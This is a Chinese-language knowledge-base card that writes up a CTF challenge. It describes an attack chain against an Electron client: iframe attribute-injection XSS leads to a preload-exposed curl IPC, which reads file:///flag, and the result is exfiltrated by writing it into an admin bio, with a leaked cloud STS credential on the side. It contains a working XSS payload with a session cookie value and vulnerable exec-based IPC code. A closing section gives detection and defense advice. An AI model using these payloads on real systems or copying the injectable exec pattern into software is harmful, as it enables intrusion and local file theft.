---
id: web-generic-xss-electron-ipc-curl-file-read-bot-cookie
title: Electron 客户端 XSS + preload IPC curl：file:// 读取本地 flag 并借 Bot 写回管理员简介
type: scenario
domain: web
path: web/generic/xss
technique: electron-ipc-curl-file-read-bot-cookie-injection
tags:
- web
- xss
- electron
- ipc
- file-read
- bot
- cookie
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V244
  verified_at: '2026-11-07T13:17:13+08:00'
  notes: 已对照原文与图22-24核对；Electron curl IPC、iframe属性注入XSS、file:///flag读取与save-bio外带链均一致；COS STS辅助链与原文一致；PoC未复跑
url: /docs/web/generic/xss/web-generic-xss-electron-ipc-curl-file-read-bot-cookie/
draft: false
kb_aliases:
- FakeXSS
- Electron IPC curl
- file:///flag
- preload electronAPI
- iframe onload XSS
- Bot cookie 注入
- save-bio 外带
---

## 一句话结论

Electron 客户端在 preload 里把 `curl` 暴露成 `window.electronAPI.curl(url)`，主进程执行 `exec('curl -L "' + url + '"')`；Web 端登录页又把管理员可控的 `key` 原样拼进 `<iframe src="...">`。攻击者以管理员身份调用 `/api/set-login-bg` 写入带 `" onload="...` 的 key，Bot 用 Electron 客户端访问登录页时执行 XSS：先 `document.cookie` 写入管理员会话，再调用 `electronAPI.curl('file:///flag')` 读取本地文件，最后 `fetch('/api/save-bio')` 把内容写进管理员个人简介；攻击者再用该会话请求 `/api/user` 读取 bio，拿到 flag。

## 原理

- **Electron IPC 暴露危险能力**：`ipcMain.handle('curl', async (event, url) => { const cmd = \`curl -L "${url}"\`; exec(cmd, ...) })` 把任意 URL 交给 shell 的 curl；preload 通过 `contextBridge` 暴露 `electronAPI.curl`。渲染进程一旦 XSS，就能调用该 IPC 读取 `file://`、访问内网、甚至通过命令拼接注入（URL 中的 `"`/`;` 可逃逸，但本题用 `file:///flag` 即可）。
- **`loadURL` IPC**：另有 `ipcMain.handle('load-remote-url', (e,url)=>mainWindow.loadURL(url))`，可让渲染进程导航到任意页面，扩大攻击面（本题主要用 curl）。
- **iframe 拼接 XSS**：服务端在登录页把 `loginBgUrl` 拼成 `<iframe id="backgroundframe" src="${fileUrl}" ...></iframe>`，`fileUrl = http://ctf.mudongmudong.com/${bgURL}`，未做 HTML 属性转义；`key` 中插入 `" onload="..." x="` 即可闭合 `src` 属性并注入事件处理器。
- **Bot 访问与 Cookie**：`/api/bot` 用 `execFile(scriptPath, ['--no-sandbox'])` 启动 bot，bot 用 Electron 客户端访问 `http://127.0.0.1:3000/`（登录页），且“bot 不会带着秘密去访问”——它没有管理员 Cookie。XSS 通过 `document.cookie='connect.sid=...'` 手动写入管理员会话（攻击者已知/可获取的会话值），使后续同源 `fetch` 携带管理员身份。
- **file:// 读取 + 外带**：`window.electronAPI.curl('file:///flag')` 让主进程 `curl -L file:///flag` 读取本地 flag，Promise 返回 stdout；XSS 再 `fetch('/api/save-bio', {method:'POST', body: JSON.stringify({bio: JSON.stringify(data)})})`，由于已写入管理员 Cookie，同源 fetch 会带上会话，把 flag 存进 admin 的 bio。攻击者用自己的管理员会话 `GET /api/user` 读取 bio。
- **为什么可行**：Electron `contextIsolation: true` 并不阻止 preload 主动暴露的 `curl` IPC；渲染层 XSS 直接获得主进程能力。`exec('curl -L "url"')` 对 `file://` 不做限制，且 shell 拼接还可能命令注入。
- **辅助发现**：`/api/avatar-credentials` 返回腾讯云 COS 临时密钥，策略允许 `cos:PutObject` 指定对象和 `cos:GetBucket` 整个桶；攻击者可列桶并下载 `www/server_bak.js`，从中拿到管理员明文口令、session secret 与永久 STS 密钥（原文用它进一步确认/利用）。这是另一类云临时凭证权限过大问题。

## 触发条件

- 目标同时具备：Electron 客户端（preload 暴露 `curl`/`loadURL` 等 IPC）+ Web 登录页把用户输入拼进 HTML 属性/iframe。
- 攻击者能获得管理员权限（或能设置 `set-login-bg` 的会话）；本题通过修改 Cookie 中 `meta.user=admin` 进入 `/panel`（见 jsonpickle 卡）或通过 COS 泄露的管理员口令登录。
- Bot 使用该 Electron 客户端访问登录页，且 XSS 能执行；bot 没有管理员 Cookie，但攻击者能把已知管理员会话值写进 `document.cookie`。
- `curl` IPC 可读取 `file://`（Electron 主进程权限允许），且 `/api/save-bio` 与 `/api/user` 同源、可携带 Cookie。
- 目标 flag 在本地文件（如 `/flag`），且客户端进程有读权限。

## 利用步骤

1. 下载客户端（`/downloadClient`），改 zip 解压，看到 `LICENSE.electron.txt`/`app-64.7z`；用 WinAsar 解包，读 `main.js`/`preload.js`，确认 `curl`/`loadURL` IPC 与 `electronAPI`。
2. 注册登录 Web，抓包发现上传头像时 `/api/avatar-credentials` 返回腾讯云临时密钥；用 `cos-python-sdk-v5` 列桶/下载（可选），从 `www/server_bak.js` 获取管理员口令、session secret 等。
3. 以管理员身份（或修改 Cookie 为 admin）调用 `/api/set-login-bg`，提交带 `" onload="...` 的 key；服务端拼进登录页 iframe。
4. 构造 onload JS：写入管理员 `connect.sid` Cookie → `window.electronAPI.curl('file:///flag')` → `fetch('/api/save-bio')` 把返回内容写进 bio。
5. 触发 `/api/bot`，让 bot 用 Electron 客户端访问登录页；XSS 执行，flag 写入管理员 bio。
6. 用管理员会话 `GET /api/user` 读取 `bio`，得到 flag（原文 `NepCTF{10362373-...}`）。

## PoC

```json
// /api/set-login-bg 的 key（注入 iframe onload）
{"key":"x\" onload=\"document.cookie='connect.sid=s%3Ao93qeMzwrfLvUBBxG94TsMckuo9-LdG0.97efDsrL5mM5bEOghQuLC1KUgn3CE4j9NEZpmQuTCes';window.electronAPI.curl('file:///flag').then(data=>{fetch('/api/save-bio',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({'bio':JSON.stringify(data)})})})\" x=\""}
```

```html
<!-- 服务端拼接结果（未转义） -->
<iframe id="backgroundframe" src="https://ctf.mudongmudong.com/x"
  onload="document.cookie='connect.sid=s%3A...';window.electronAPI.curl('file:///flag').then(data=>{fetch('/api/save-bio',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({'bio':JSON.stringify(data)})})})"
  x="" style="..."></iframe>
```

```javascript
// 客户端 main.js 中的危险 IPC
ipcMain.handle('curl', async (event, url) => {
  const cmd = `curl -L "${url}"`;
  return new Promise((resolve) => exec(cmd, (error, stdout) => resolve({success: !error, data: stdout})));
});
ipcMain.handle('load-remote-url', async (event, url) => { mainWindow.loadURL(url); });
```

```http
GET /api/user HTTP/1.1
Host: target
Cookie: connect.sid=<admin session>
# -> {"username":"admin",...,"bio":"{&#x22;success&#x22;:true,&#x22;data&#x22;:&#x22;NepCTF{...}\\n&#x22;}"}
```

原文截图显示管理员面板、假 flag 的 `/vault`、以及最终 `/api/user` 返回的 bio；本卡未复跑。

## 变体与关联

- **命令注入**：`exec(\`curl -L "${url}"\`)` 中 URL 若含 `"`/`;`/`$()`，可逃逸引号执行任意命令；本题只用了 `file://` 读文件，实际危害可更大。
- **loadURL 变体**：`load-remote-url` IPC 可让渲染进程加载任意页面，结合 XSS/开放重定向可做更多绕过；若客户端开启 `nodeIntegration`，XSS 直接变 RCE。
- **COS 临时凭证**：`/api/avatar-credentials` 的 STS 策略包含 `cos:GetBucket`（整个桶），使临时密钥可列桶/下载 `server_bak.js`；应严格限制到上传对象前缀与 PutObject。
- **关联**：`[[ai-security-agent-security-deepchat-mermaid-xss-ipc-mcp-command-exec]]`（Electron/IPC XSS→命令执行）、`[[ai-security-agent-security-deepchat-mermaid-xss-ipc-filepresenter-path-traversal]]`（Electron IPC 文件访问）、`[[web-python-deserialization-jsonpickle-forbidden-list-clear-bypass]]`（本题同场 Web 的 jsonpickle 管理员伪造）。
- **边界**：Electron 版本/`contextIsolation`/preload 暴露面不同；若 `curl` IPC 被移除或限制协议，`file://` 读取不成立；bot 的访问目标/会话注入方式需按题目调整。

## 检测与防御

- **Electron 客户端**：不要在 preload 暴露通用 `curl`/`exec`/`loadURL`；必须用时做协议/域名白名单（禁止 `file://`/`gopher://` 等）、参数化调用（`execFile('curl', ['-L', url])`）并校验 URL；启用 `contextIsolation`、关闭 `nodeIntegration`、启用 sandbox、CSP。
- **Web 端**：所有拼进 HTML 的用户输入做上下文转义（属性值用 HTML 实体/引号转义）；`iframe src` 用白名单 URL 而不是拼接；管理员操作加 CSRF/二次校验；Bot 访问时不要复用可被 XSS 写入的会话。
- **云凭证**：STS 临时密钥最小权限（只允许 PutObject 指定前缀、限制大小/次数），不要给 `GetBucket` 整个桶；服务端不要返回长期 secret。
- **检测**：`set-login-bg` 的 key 含引号/`onload`/`javascript:`；登录页出现异常 iframe/onload；Electron 主进程执行 `curl file://` 或异常 URL；COS 临时密钥被用于 ListBucket/下载非头像对象；管理员 bio 异常写入。
